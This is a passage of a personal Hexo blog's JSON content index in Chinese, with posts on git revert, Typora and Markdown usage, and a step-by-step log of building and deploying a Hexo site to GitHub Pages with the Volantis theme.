revert是生成一次新的commit冲抵原来的commit， reset直接删除某些commit的内容) 12345678910111213# 注意有多个提交需要回退的话，要由新到旧进行 revert，即先D后C。会生成两个新有提交：D’ 和 C’，按A B C D D’ C’的先后顺序依次排列在分支上git revert idCodeDgit revert idCodeCgit revert OLDER_COMMIT^…NEWER_COMMIT # 多个错误提交时批量回退# 回滚最新一次的提交记录：git revert HEAD# 回滚前一次的提交记录：git revert HEAD^# 对历史上的commit回滚git revert # 确认生成的新commit编译成功，也没有文件冲突，可以push到服务器，完成回滚。","categories":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/tags/git/"}]},{"title":"Typora使用指南","slug":"Typora使用指南","date":"2021-12-20T06:14:27.000Z","updated":"2021-12-20T06:14:27.000Z","comments":true,"path":"2021/12/20/Typora使用指南/","link":"","permalink":"https://avalooooooon.github.io/2021/12/20/Typora%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","excerpt":"","text":"文章参考网址官方文档 关于Typora主要使用Github制定的GFM标准。可以在文件 - 偏好设置 - Markdown 语法偏好 - 严格模式 中将标准设置为「更严格地遵循 GFM 标准」。 主题美化在 Typora 中 CSS 被称为「主题」，但其本质仍是 CSS 文件。可以在文件 - 偏好设置 - 主题 - 打开主题文件夹看到这些 CSS 文件。也可以自己修改、新建适合使用需求的 CSS 文件。 Typora 自带了若干主题，可以在 官网 下载更多的主题。 常用写作设置通过打开文件 - 偏好设置定制适合自己编辑习惯的设置。 实时预览通过视图 - 源代码模式或左下角的 &lt;&#x2F;&gt; 按钮或用快捷键command+ /(Mac)进入源代码模式（Source Mode）。 打字机模式&amp;专注模式在视图 - 专注模式 / 打字机模式中勾选使用这两个模式。「打字机模式」使得你所编辑的那一行永远处于屏幕正中。「专注模式」使你正在编辑的那一行保留颜色，而其他行的字体呈灰色。 智能标点可以自动将不是很美观的直引号 “ ‘ 转化为更美观的弯引号 “ ‘ ’ ”。详情见官方文档。 换行在 Markdown 语法中，换行（line break）与换段是不同的。且换行分为软换行和硬换行。 软换行：在 Typora 中可以通过Shift + Enter完成一次软换行。软换行只在编辑界面可见，当文档被导出时换行会被省略。硬换行：通过空格 + 空格 + Shift + Enter完成一次硬换行，或直接插入HTML标签&lt;br&#x2F;&gt;。这也是许多 Markdown 编辑器所原生支持的。硬换行在文档被导出时将被保留，且没有换段的段后距。 换段：通过 Enter 完成一次换段。Typora 会自动帮你完成两次 Shift + Enter 的软换行，从而完成一次换段。这也意味着在 Markdown 语法下，换段是通过在段与段之间加入空行来实现的。 Windows 风格（CR+LF）与 Unix 风格（CR）的换行符CR 表示回车 \\r,即回到一行的开头，而 LF 表示换行\\n ,即另起一行。所以 Windows 风格的换行符本质是「回车 + 换行」，而 Unix 风格的换行符是「换行」。这也是为什么 Unix &#x2F; Mac 系统下的文件，如果在 Windows 系统直接打开会全部在同一行内。 可以在文件 - 偏好设置 - 编辑器 - 默认换行符中对此进行切换。 表格插入不需要按传统的md语法要求的操作，只需要在行内鼠标右键 - 插入 - 表格(注意不能在源代码模式下操作），并输入行数和列数，Typora 就会自动生成一张样式不错的空表格。 图片插入Markdown 原生不太注重图片插入的功能，但可以在 Typora 中： 直接使用右键 - 复制+ Ctrl + V将网络图片、剪贴板图片复制到文档中。 拖动本地图片到文档中 Typora 会自动帮你插入符合 Markdown 语法的图片语句，并给它加上标题。你也完全可以使用图床来保证文档在分享后图片仍能正常显示。 更强大的是，Typora 支持在拖动或 Ctrl + V 网络图片后自动将其保存到本地。可以在文件 - 偏好设置 - 编辑器 - 图片插入中选择复制到哪个路径，什么情况下需要复制。 空格已经把设置改了，现在导出也会保留连续空格。输入连续空格后，会在编辑器视图里保留这些空格，但打印或导出时，这些空格会被省略成一个。在源代码模式下，为每个空格前加一个 \\ 转义符，或者直接使用 HTML 风格的 &amp;nbsp;(No-Break Space) 来保持连续的空格。 表情插入emoji：用:emoji:的形式打出。 链接引用和脚注链接引用类似于我们常在论文末尾看到的「参考文献」的写法，你可以通过[]: 的语法来为你的文档加上链接引用。 脚注即某段话结尾右上角标有数字标记，页面底部进行注释的写法。你可以在需要插入脚注标号的位置写 [^ number ] ，再在下方通过 [^ number ]: 在文档中插入脚注。 注意: 不要遗漏了脚注编号 number 前后的空格 ! 示例[^ 这是一个脚注 ][^ 这是一个脚注 ][^ 这是一个脚注 ]:脚注内容 YAML front-matterTypora 支持在文档头部加上基于 YAML 的 front-matter 信息，这一特性适用于把 Markdown 文档分类归档上传到用 Hexo 框架搭建的博客中。 LaTeXTypora 原生支持 LaTeX 语法，有两种方式输入 LaTeX 风格的数学公式：行内公式（inline）：用$…$ 括起公式，公式会出现在行内。块间公式（display）：用$$…$$ 括起公式（注意 $$ 后需要换行），公式会默认显示在行中间。 其它使用范例typora 画流程图、时序图(顺序图)、甘特图1、横向流程图源码格式：横向流程图 123456graph LRA[方形] --&gt;B(圆角) B --&gt; C&#123;条件a&#125; C --&gt;|a=1| D[结果1] C --&gt;|a=2| E[结果2] F[横向流程图] 2、竖向流程图源码格式： 竖向流程图 123456graph TDA[方形] --&gt; B(圆角) B --&gt; C&#123;条件a&#125; C --&gt; |a=1| D[结果1] C --&gt; |a=2| E[结果2] F[竖向流程图] 3、标准流程图源码格式：标准流程图 123456789st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st-&gt;op-&gt;condcond(yes)-&gt;io-&gt;econd(no)-&gt;sub1(right)-&gt;op 4、标准流程图源码格式（横向）：横向标准流程图 123456789st=&gt;start: 开始框op=&gt;operation: 处理框cond=&gt;condition: 判断框(是或否?)sub1=&gt;subroutine: 子流程io=&gt;inputoutput: 输入输出框e=&gt;end: 结束框st(right)-&gt;op(right)-&gt;condcond(yes)-&gt;io(bottom)-&gt;econd(no)-&gt;sub1(right)-&gt;op 5、UML时序图源码样例：UML时序图 12345对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象A-&gt;对象B: 你真的好吗？ 6、UML时序图源码复杂样例：复杂UML 1234567891011Title: 标题：复杂使用对象A-&gt;对象B: 对象B你好吗?（请求）Note right of 对象B: 对象B的描述Note left of 对象A: 对象A的描述(提示)对象B--&gt;对象A: 我很好(响应)对象B-&gt;小三: 你好吗小三--&gt;&gt;对象A: 对象B找我了对象A-&gt;对象B: 你真的好吗？Note over 小三,对象B: 我们是朋友participant CNote right of C: 没人陪我玩 7、UML标准时序图样例：标准UML 123456789101112%% 时序图例子,-&gt; 直线，--&gt;虚线，-&gt;&gt;实线箭头 sequenceDiagram participant 张三 participant 李四 张三-&gt;王五: 王五你好吗？ loop 健康检查 王五-&gt;王五: 与疾病战斗 end Note right of 王五: 合理 食物 &lt;br/&gt;看医生... 李四--&gt;&gt;张三: 很好! 王五-&gt;李四: 你怎么样? 李四--&gt;王五: 很好! 8、甘特图样例：甘特图 12345678910111213141516171819%% 语法示例 gantt dateFormat YYYY-MM-DD title 软件开发甘特图 section 设计 需求 :done, des1, 2014-01-06,2014-01-08 原型 :active, des2, 2014-01-09, 3d UI设计 : des3, after des2, 5d 未来任务 : des4, after des3, 5d section 开发 学习准备理解需求 :crit, done, 2014-01-06,24h 设计框架 :crit, done, after des2, 2d 开发 :crit, active, 3d 未来任务 :crit, 5d 耍 :2d section 测试 功能测试 :active, a1, after des3, 3d 压力测试 :after a1 , 20h 测试报告 : 48h","categories":[{"name":"文档编写","slug":"文档编写","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/"},{"name":"编辑器","slug":"文档编写/编辑器","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/%E7%BC%96%E8%BE%91%E5%99%A8/"}],"tags":[]},{"title":"Markdown笔记","slug":"Markdown笔记","date":"2021-12-20T06:12:19.000Z","updated":"2021-12-20T06:12:19.000Z","comments":true,"path":"2021/12/20/Markdown笔记/","link":"","permalink":"https://avalooooooon.github.io/2021/12/20/Markdown%E7%AC%94%E8%AE%B0/","excerpt":"","text":"typora快捷键 标题#一级标题：## 二级标题### 三级标题#### 四级标题 段落在 Markdown 语法中，换行（line break）与换段是不同的。且换行分为软换行和硬换行。换行：两个以上空格加回车，或直接插入HTML标签&lt;br&#x2F;&gt; 软换行：在 Typora 中可以通过 Shift + Enter 完成一次软换行。软换行只在编辑界面可见，当文档被导出时换行会被省略。硬换行：通过 空格 + 空格 + Shift + Enter 完成一次硬换行，或直接插入HTML标签&lt;br&#x2F;&gt;。这也是许多 Markdown 编辑器所原生支持的。硬换行在文档被导出时将被保留，且没有换段的段后距。 换段：通过在段与段之间加入空行来实现。在段落后面使用一个空行来表示重新开始一个段落。 分隔线：在一行中用三个以上的星号、减号、下划线来建立一个分隔线，行内不能有其他东西。效果如下： 在星号或是减号中间插入空格没有影响。下面每种写法都可以建立分隔线：***---___* * * 文本~~要删除的文字~~: 要删除的文字&lt;u&gt;带下划线文本&lt;&#x2F;u&gt;: 带下划线文本**演示粗体**: 演示粗体*演示斜体* : 演示斜体 脚注：创建脚注格式为： 主段落[^ 脚注01 ] [^ 脚注01 ]: 这是脚注内容。效果如下： 主段落^ 脚注01 。 代码段内插入代码片段`代码内容` ，效果为 代码内容 整段插入代码片段1. 用一对``` 包裹一段代码，并指定一种语言（也可以不指定）：``` pythonprint``` 1print 2. 用段落前缩进(4 个空格或者一个制表符（Tab ）)的方式显示代码块。注意代码要在一个新段开始，否则无法正确显示为代码格式。 区块引用在段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号。一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套，以此类推：&gt; 区块引用&gt;&gt; 第一层嵌套&gt;&gt;&gt; 第二层嵌套&gt; 这个位置，这样是无效的 区块引用 第一层嵌套 第二层嵌套这个位置，尝试用一个&gt;是无效的 在列表内添加区块需要在 &gt; 前添加四个空格的缩进。 列表无序列表使用*、+或-作为列表标记，这些标记后面要添加一个空格，然后再填写内容：+ 第一项+ 第二项 显示为： 第一项 第二项 有序列表使用数字并加上 . 号来表示：1. 第一项2. 第二项3. 第三项 显示为： 第一项 第二项 第三项 列表嵌套只需在子列表中的选项前面添加四个空格即可1. 第一项： - 第一项嵌套的第一个元素 - 第一项嵌套的第二个元素 显示为： 第一项： 第一项嵌套的第一个元素 第一项嵌套的第二个元素 链接和图片插入链接[链接名称](链接地址)或者&lt;链接地址&gt;链接名称或者https://avalooooooon.github.io/index 高级链接: 可以通过变量来设置一个链接，变量赋值在文档末尾进行：这个链接用 1 作为网址变量 [Google][1]: Google这个链接用avalon作为网址变量[mygithub][avalon]: mygithub然后在文档的结尾为变量赋值（网址） 插入图片可以是本地图片也可以是网络图片。格式：![alt 属性文本](图片地址 “可选标题”) Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 &lt;img&gt; 标签&lt;img src&#x3D;”图片链接” width&#x3D;”50%”&gt; 表格表格格式使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行| First Header | Second Header || ————- | ————- || Content Cell | Content Cell || Content Cell | Content Cell | First Header Second Header Content Cell Content Cell Content Cell Content Cell 对齐方式可以设置表格的对齐方式：-: 设置内容和标题栏居右对齐。:- 设置内容和标题栏居左对齐。:-: 设置内容和标题栏居中对齐。实例如下：| 左对齐 | 右对齐 | 居中对齐 || :—–| —-: | :—-: || 单元格 | 单元格 | 单元格 || 单元格 | 单元格 | 单元格 | 左对齐 右对齐 居中对齐 单元格 单元格 单元格 单元格 单元格 单元格 公式使用两个美元符$$ 包裹 TeX 或 LaTeX 格式的数学公式来实现。提交后，问答和文章页会根据需要加载 Mathjax 对数学公式进行渲染。如：显示效果为：$$\\mathbf{V}_1 \\times \\mathbf{V}_2 &#x3D; \\begin{vmatrix}\\mathbf{i} &amp; \\mathbf{j} &amp; \\mathbf{k} \\\\frac{\\partial X}{\\partial u} &amp; \\frac{\\partial Y}{\\partial u} &amp; 0 \\\\frac{\\partial X}{\\partial v} &amp; \\frac{\\partial Y}{\\partial v} &amp; 0 \\\\end{vmatrix}${$tep1}{\\style{visibility:hidden}{(x+1)(x+1)}}$$ 转义Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：文本加粗** 正常显示星号 ** 使用HTML元素不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。目前支持的 HTML 元素有：&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;等 ，如：&lt;kbd&gt;Command&lt;&#x2F;kbd&gt;+&lt;kbd&gt;C&lt;&#x2F;kbd&gt; :使用 Command+C 组合键进行复制","categories":[{"name":"文档编写","slug":"文档编写","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/"},{"name":".md","slug":"文档编写/md","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/md/"}],"tags":[{"name":"markdown","slug":"markdown","permalink":"https://avalooooooon.github.io/tags/markdown/"}]},{"title":"建站记录","slug":"建站记录","date":"2021-12-19T06:53:04.000Z","updated":"2022-09-21T08:56:14.567Z","comments":true,"path":"2021/12/19/建站记录/","link":"","permalink":"https://avalooooooon.github.io/2021/12/19/%E5%BB%BA%E7%AB%99%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Part1 环境搭建安装nodejs12node -v npm -v #查看版本 安装git1git --version #查看版本 创建博客文件夹并安装hexo自己在想要的位置创建文件夹blog，在该文件夹中新建终端并运行以下命令： 12npm install -g hexo-clihexo -v 在Windows中，如果出现”‘hexo’不是内部或外部命令，也不是可运行的程序”，需要找到电脑中新安装的hexo的位置，并将hexo.cmd所在文件夹的路径添加到系统变量的PATH中。 可能出现的问题运行npm install -g hexo-cli时，可能提示没有权限。这里强烈建议不要用sudo方式强行获得权限。解决方法：第一步，赋予目录权限；第二步，安装hexo: 12sudo chown -R `whoami` /usr/local/lib/node_modules #这里不用改路径npm install hexo-cli -g 至此安装部分已经结束。下面对hexo进行初始化，给自己准备存放hexo主要内容的文件夹取一个名字（比如myblog），运行下列命令： 123hexo init myblogcd myblognpm install 可以看到，myblog目录下出现了：–node_modules: 依赖包–public：存放生成的页面–scaffolds：生成文章的一些模板–source：用来存放你的文章–themes：主题–_config.yml：博客的配置文件 运行下列命令打开hexo的服务，在浏览器输入localhost:4000就可以看到生成的博客了： 12hexo ghexo server 创建Github库并绑定SSH首先在自己的github下new一个和自己注册github时的用户名xxx同名的仓库，后面加.github.io。也就是新仓库的名字叫xxx.github.io。接下来生成SSH。依次运行下列命令： 12345git config --global user.name &quot;yourname&quot; #github用户名git config --global user.email &quot;youremail&quot; #github绑定的邮箱git config user.namegit config user.email #检查一下输对没有ssh-keygen -t rsa -C &quot;youremail&quot; #创建SSH，一路回车 找到～&#x2F;.ssh文件夹。（Mac显示隐藏文件夹，同时按下三个组合键：Shift + Command + . ）在自己GitHub的setting中找到SSH keys，点击New SSH key。将id_rsa.pub里面的信息全部复制进去并保存。查看是否成功： 1ssh -T git@github.com 将hexo托管到个人Github先安装deploy-git ，也就是部署的命令，这样才能用命令部署到GitHub: 1npm install hexo-deployer-git --save 在myblog文件夹下打开站点配置文件*_config.yml*，翻到最后，修改为 1234deploy: type: git repo: git@github.com:xxx/xxx.github.io.git branch: master 准备就绪后, 123hexo clean #清除了之前生成的东西，也可以不加。hexo g #生成静态文章，hexo generate的缩写hexo d #部署文章，hexo deploy的缩写,,可与hexo g合并为 hexo d -g 过一会儿就可以在http://xxx.github.io 这个网站看到博客了。 写文章使用指令新建一篇文章： 1hexo new [layout] &lt;title&gt; 写完后，运行下列代码以部署更新。 123hexo cleanhexo ghexo d #可与hexo g合并为 hexo d -g 关于[layout]Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径。自己自定义的其他布局和 post 相同，都将储存到 source&#x2F;_posts 文件夹。可以通过 publish 命令将草稿移动到 source&#x2F;_posts 文件夹： 1hexo publish [layout] &lt;title&gt; 草稿默认是不会显示在页面中的，可在执行时加上 –draft 参数，或是把 render_drafts 参数设为 true来预览草稿。也可以编辑现有的layout，比如post的layout默认是hexo\\scaffolds\\post.md比如想添加categories（文章分类目录），以免每次手工输入，只需要修改这个文件添加一行，如下： 1234title: &#123; &#123; title &#125; &#125; #文章页面上的显示名称，可以任意修改，不会出现在URL中date: &#123; &#123; date &#125; &#125; #文章生成时间，一般不改，当然也可以任意修改categories: #文章分类目录，可以为空tags: #文章标签，可空，多标签请用格式[tag1,tag2,tag3]， 请注意，大括号与大括号之间多加了个空格，否则会被转义，不能正常显示。 注意，所有文件：后面都必须有个空格，不然会报错。 写作时可能用到的插件1.插入图片 12cd blog/myblog # 进入本地博客文件夹npm install https://github.com/CodeFalling/hexo-asset-image --save 接下来打开hexo的配置文件_config.yml，找到 post_asset_folder，把这个选项从false改成true。最后打开&#x2F;node_modules&#x2F;hexo-asset-image&#x2F;index.js，将内容更换为下面的代码（参考了这篇博客)。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#x27;use strict&#x27;;var cheerio = require(&#x27;cheerio&#x27;);// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) &#123; return str.split(m, i).join(m).length;&#125;var version = String(hexo.version).split(&#x27;.&#x27;);hexo.extend.filter.register(&#x27;after_post_render&#x27;, function(data)&#123; var config = hexo.config; if(config.post_asset_folder)&#123; var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, &#x27;/&#x27;, 1) + 1; else var beginPos = getPosition(link, &#x27;/&#x27;, 3) + 1; // In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;. var endPos = link.lastIndexOf(&#x27;/&#x27;) + 1; link = link.substring(beginPos, endPos); var toprocess = [&#x27;excerpt&#x27;, &#x27;more&#x27;, &#x27;content&#x27;]; for(var i = 0; i &lt; toprocess.length; i++)&#123; var key = toprocess[i]; var $ = cheerio.load(data[key], &#123; ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false &#125;); $(&#x27;img&#x27;).each(function()&#123; if ($(this).attr(&#x27;src&#x27;))&#123; // For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;. var src = $(this).attr(&#x27;src&#x27;).replace(&#x27;\\\\&#x27;, &#x27;/&#x27;); if(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp; !/^\\s*\\//.test(src)) &#123; // For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed. // In addition, to support multi-level local directory. var linkArray = link.split(&#x27;/&#x27;).filter(function(elem)&#123; return elem != &#x27;&#x27;; &#125;); var srcArray = src.split(&#x27;/&#x27;).filter(function(elem)&#123; return elem != &#x27;&#x27; &amp;&amp; elem != &#x27;.&#x27;; &#125;); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join(&#x27;/&#x27;); $(this).attr(&#x27;src&#x27;, config.root + link + src); console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src); &#125; &#125;else&#123; console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;); console.info&amp;&amp;console.info($(this)); &#125; &#125;); data[key] = $.html(); &#125; &#125;&#125;); 现在就可以插入图片了，比如hexo new post photo之后就在source&#x2F;_posts生成photo.md文件和photo文件夹，我们把要插入的图片复制到photo文件夹内，在photo.md文件里面按markdown的标准写,（我的文件名是head.jpeg）比如 Part2 基本配置hexo基本配置——_config.yml在文件根目录下的_config.yml，就是整个hexo框架的配置文件了。可以在里面修改大部分的配置。详细可参考官方的配置描述。 网站参数 描述title 网站标题subtitle 网站副标题description 主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。author 用于主题显示文章的作者language 网站使用的语言timezone 网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：America&#x2F;New_York, Japan, 和 UTC 。 网址参数 描述url 你的网站域名root 网站根目录permalink 文章的永久链接格式permalink_defaults 用于主题显示文章的作者 permalink，也就是你生成某个文章时的那个链接格式。比如我新建一个文章叫temp.md，那么这个时候他自动生成的地址就是http://yoursite.com/2018/09/05/temp。以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找永久链接 。 参数 描述:year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F; 2013&#x2F;07&#x2F;14&#x2F;hello-world:year-:month-:day-:title.html :year-:month-:day-:title.html:category&#x2F;:title foo&#x2F;bar&#x2F;hello-world 再往下翻，中间这些都默认就好了。 12345678theme: landscape # Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: &lt;repository url&gt; branch: [branch] theme：主题名deploy：网站部署。repo就是仓库(Repository)的简写。branch选择仓库的哪个分支。这个在之前进行github page部署的时候已经修改过了，不再赘述。而这个在后面进行双平台部署的时候会再次用到。 Front-matterFront-matter 是文件最上方以 — 分隔的区域，用于指定个别文件的变量，就是.md文件最上面的这部分内容(下面的例子是YAML语法）： 1234567title: Hello Worlddate: 2013/7/13 20:46:25author:tags:- PS3- Games--- 注意，所有文件-后面都必须有个空格!基本格式要求：1，YAML大小写敏感；2，使用缩进代表层级关系；3，缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格） 部分标签详解：layout：布局。指定要使用的模版样式。如果不指定这个将会使用根目录/_config.yml中的默认配置default_layout: post。title： 标题。默认Markdown的文件标题。date： 建立日期。默认文件创建时间。author： 作者。默认根 _config.yml中的 author。img: 文章特征图。默认featureImages 中的某个值。updated： 更新日期comments： 开启文章的评论功能（国内好像用不了disqus？）。hexo默认支持disqus评论功能是comments：true需要先去disqus 官网注册一下账号：https://disqus.com/profile/signup/然后进入到设置：https://disqus.com/home/settings/因为这个评论插件是要登陆评论的，先配置你的个人信息，看左边的第一行Profile和Username，然后在主题_config.yml下面添加disqus_shortname:注册disqus时你自己设置的名字就可以在文章下面看评论功能了。 12Disqus settings（https://disqus.com/）disqus_username: 你的Username disqus设置时可能需要清除一下缓存，否则可能会出现加载不出来的情况。 通过常用的hexo上传方式(hexo clean，清除hexo缓存 + hexo g，生成对应html文件 + hexo d，将hexo对应的修改上传到git上)。tags： 给文章添加标签，使其能在标签页中显示。不适用于分页。标签没有顺序和层次。一篇文章可以设置多个标签。categories： 整体内容基本与 tags一致，区别在于在进行分类管理的时候此标签下的内容是有严格的顺序和层次的，tags没有。不适用于分页。因为hexo的分类具有层次关系，同一文章不能同时存在两个同级分类中，所以下面这种方式 123categories:- Diary- Life 会使分类Life成为Diary的子分类，而不是并列分类。因此，有必要为文章选择尽可能准确的分类。 如果你需要为文章添加多个分类，可以尝试以下 list 中的方法: 1234categories:- [Diary, PlayStation]- [Diary, Games]- [Life] 此时这篇文章同时包括三个分类： PlayStation 和 Games 分别都是父分类 Diary 的子分类，同时 Life 是一个没有子分类的分类。permalink: 覆盖文章网址。直白的说就是静态文件的存放地址。如果不指定这个将会使用根目录/_config.yml中的默认配置permalink: :year/:month/:day/:title/。如果指定的文件夹不存在就会创建一个。这里如何设置最后在页面中使用的连接地址就会是什么样的，例如上面这种方式最终生成的文章的连接地址就是xxx.github.io/2022/08/11/：title/。keywords： 仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）。用于SEO优化，这篇文章包含哪些关键词。有人百度这些关键词的时候可能就会显示本页面。top：默认true。推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章。配置 默认值 含义cover false 表示该文章是否需要加入到首页轮播封面中coverImg 无 表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片password 无 文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc ture 是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax false 是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml文件中也需要开启才行summary 无 文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要reprintPolicy 无 文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个 文章的front-matter，用 hexo n 新建的时候会自动生成，其他时候手动写。在draft文件夹里面更改post.md可以更改自动生成的模板。 拓展：当前的主题中没有分类页和标签页怎么办？下面是tags创建步骤：根据自己的配置创建文件夹，比如配置中（根目录/_config.yml）设置的标签根目录为tag_dir: tags，所以新建tags目录。1.创建tags文件夹，在命令行中输入：hexo new page &quot;tags&quot;。2.找到新建的文件夹\\source\\tags下的index.md文件3.修改其front-matter为如下格式： 123456---title: tagsdate: 2019-08-13 09:39:50type: tags // 帮助脚本识别这是一个用来创建tags的文档layout: tag // 我的tags模版标签叫tag你可以根据你的模版名称输入对应的名称--- 4.生成静态文件：hexo g5.通过主题设置/themes/你的主题名称/_config.yml中的配置，在页面指定一个连接指向tags文件夹，就可以在页面中看到标签页了。 123456789menu: # Project: # path: /categories/Projects # card: project-card # Stuffs: # path: /tags/Stuffs # card: article-card Home: / tags: /tags Layout使用命令 1hexo new [layout] &lt;title&gt; 它默认使用的是post这个布局，也就是在source文件夹下的_post里面。Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径。自定义的其他布局和 post 相同，都将储存到 source&#x2F;_posts 文件夹。 page如果想另起一页，那么可以使用 1hexo new page board draft如果想写文章，又不希望被看到，那么可以 1hexo new draft newpage 这样会在source&#x2F;_draft中新建一个newpage.md文件。如果你的草稿文件写的过程中想要预览一下，那么可以使用 1hexo server --draft 在本地端口中开启服务预览。 如果你的草稿文件写完了，想要发表到post中， 1hexo publish draft newpage 就会自动把newpage.md发送到post中。 Part3 个性化官网上的主题们我用的是Volantis。在github下载并放到theme文件夹下，然后根目录下的_config.yml中把theme换成那个主题文件夹的名字，它就会自动在theme文件夹中搜索你配置的主题。volantis官方文档-主题配置进入volantis这个文件夹，可以看到里面也有一个配置文件_config.xml，这个配置文件是修改整个主题的配置文件。主题目录下的 _config.yml 文件通常负责主题相关配置，我们强烈建议您使用代替的主题配置文件以防止自己的配置丢失。如何操作呢–参见volantis官方文档-代替主题配置文件 。（以后补： default info cdn） menu其中，“关于”是找不到网页的，因为文章中没有about这个东西。如果想要的话，可以执行命令 1hexo new page about 它就会在根目录下source文件夹中新建一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。（目前我把关于页挪到了顶部菜单的社交-关于我。在根目录下的_config.volantis.yml的Navigation Bar的menu部分进行相关设置。） 如果你想要自己再自定义一个菜单栏的选项，那么就 1hexo new page yourdiy 然后在主题配置文件的menu菜单栏里按照其他菜单项的格式添加一个，注意把url改了且格式保持整齐（比如有时候直接回车会出错，要删掉多余的空间然后按空格键调整格式）。然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: ‘中文意思’就可以显示中文了。启用搜索功能用到的插件在主题的config.yml文件中，搜索search关键字，可以看到 12# To use hexo search, you need to install the following plugins:# npm i hexo-generator-json-content Part4 hexo附加功能评论系统在主题的config.yml文件中，搜索comment关键字，可以看到一些相关内容。 Part5 git分支进行多终端工作场景：现在在自己的笔记本上写的博客，部署在了网站上。那么在家里或者实验室的台式机，发现电脑里面没有博客的文件，或者要换电脑了，最后不知道怎么移动文件，怎么办？在这里我们就可以利用git的分支系统进行多终端工作了，这样每次打开不一样的电脑，只需要进行简单的配置和在github上把文件同步下来，就可以无缝操作了。 1 原理hexo本地文件夹中的public和.deploy.git文件夹存放的是根据.md生成的html文件，也就是博客的静态文件。对比GitHub上博客仓库的master分支也可以看到该分支的文件结构和这两个文件夹中的文件一致。也就是说，执行hexo d就是把public和.deploy.git文件夹下的文件同步到github。 我们之前在GitHub创建好的仓库默认只有master分支，这个分支存放的是静态文件。所以，可以在该仓库另外创建一个hexo分支以存放Hexo网站文件，这个分支的文件就是不同电脑需要同步的文件。 2 创建新分支在GitHub创建一个新分支hexo。该分支是由master拉取，所以其中的文件一开始和master是一样的。因为我们只需要手动管理Hexo网站文件，故可以把hexo分支设置为默认分支。这样操作后，当每次修改主题或者新增博文后，先将修改的主题文件（在themes文件夹中）或新增的博客（在source文件夹中)同步到远程仓库的hexo分支，然后再通过hexo d -g发布博文，也就是将新增的博文的静态页面同步到master分支，即可实现多台终端的同步管理。 注意！这里应进入username.github.io的settings-&gt;pages，确保是由master分支提交到了博客网站。可能会被系统变为hexo分支。 3 原主机操作：初始化分支在原主机安装了hexo的目录中，该目录包含所有博客文件，进行以下操作： git init，重新初始化仓库，对代码进行版本控制 git add - A， 添加本地所有文件到仓库 git commit -m “提交说明”，添加commit； git branch hexo，添加本地分支hexo git remote add origin &lt;server&gt;，添加远程仓库，&lt;server&gt;是在线仓库的地址 git push origin hexo，将本地仓库的源文件推送到远端hexo；此时博客的源文件就同步到github的hexo分支上了。 注意！如果当前使用的theme是使用git clone下载下来的话，由于git不能嵌套，会导致主题无法push到远程仓库，导致博客出现404页面。这种情况下，若是有自己fork的主题仓库，可以删除themes文件夹中的原主题文件夹，clone自己修改后的主题仓库地址到该文件夹。 4 新主机操作：同步分支在PC2上创建文件夹Blog，在Blog文件夹下面还行以下操作： git clone 